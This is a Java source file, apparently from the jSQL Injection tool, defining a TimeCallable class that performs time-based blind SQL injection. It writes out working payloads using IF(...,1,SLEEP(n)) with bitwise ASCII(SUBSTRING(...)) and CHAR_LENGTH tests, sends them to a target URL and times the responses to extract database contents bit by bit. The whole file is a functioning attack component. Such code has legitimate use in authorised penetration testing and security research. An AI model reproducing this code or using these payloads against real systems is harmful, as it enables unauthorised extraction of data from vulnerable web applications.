package com.jsql.model.blind;

import java.util.Calendar;
import java.util.Date;
import java.util.List;

import com.jsql.model.blind.diff_match_patch.Diff;

/**
 * Define a call HTTP to the server, require the associated url, character position and bit.
 * diffSeconds represents the response time of the current page
 */
public class TimeCallable implements IBlindCallable{
    // The URL called
    private String timeUrl;

    // Time before the url call
    Calendar calendar1 = Calendar.getInstance();
    // Time at the end of the url call
    Calendar calendar2 = Calendar.getInstance();
    // Current page loading time
    long diffSeconds;

    // Character position
    private int currentIndex;
    // Bit searched
    private int currentBit;

    // Default call used for bit test
    private boolean isLengthTest = false;

    // Constructor for preparation and blind confirmation
    TimeCallable(String inj){
        this.timeUrl = "+and+if("+inj+",1,SLEEP("+ConcreteTimeInjection.timeMatch+"))--+";
    }
    
    // Constructor for bit test
    TimeCallable(String inj, int indexCharacter, int bit){
        this.timeUrl = "+and+if(ascii(substring("+inj+","+indexCharacter+",1))%26"+bit+",1,SLEEP("+ConcreteTimeInjection.timeMatch+"))--+";
        currentIndex = indexCharacter;
        currentBit = bit;
    }

    public TimeCallable(String inj, int indexCharacter, boolean iS_LENGTH_TEST) {
    	this.timeUrl = "+and+if(char_length("+inj+")>"+indexCharacter+",1,SLEEP("+ConcreteTimeInjection.timeMatch+"))--+";
    	currentIndex = indexCharacter;
    	isLengthTest = iS_LENGTH_TEST;
	}
    
	/**
     * Check if a response time means the SQL query is true,
     * @return true if the current SQL test is confirmed
     */
    public boolean isTrue() {
        return diffSeconds < ConcreteTimeInjection.timeMatch;
    }

    /**
     * Process the URL HTTP call, use function inject() from the model
     * Calculate the response time of the current page
     */
    @Override
    public TimeCallable call() throws Exception {
        calendar1.setTime(new Date());
        ConcreteTimeInjection.callUrl(timeUrl);
        calendar2.setTime(new Date());
        long milliseconds1 = calendar1.getTimeInMillis();
        long milliseconds2 = calendar2.getTimeInMillis();
        long diff = milliseconds2 - milliseconds1;
        diffSeconds = diff / 1000;
        return this;
    }
    
	public boolean getisLengthTest() {
		return isLengthTest;
	}
	
	public int getCurrentIndex() {
		return currentIndex;
	}
	
	public int getCurrentBit() {
		return currentBit;
	}

	@Override
	public List<Diff> getOpcodes() {
		return null;
	}
}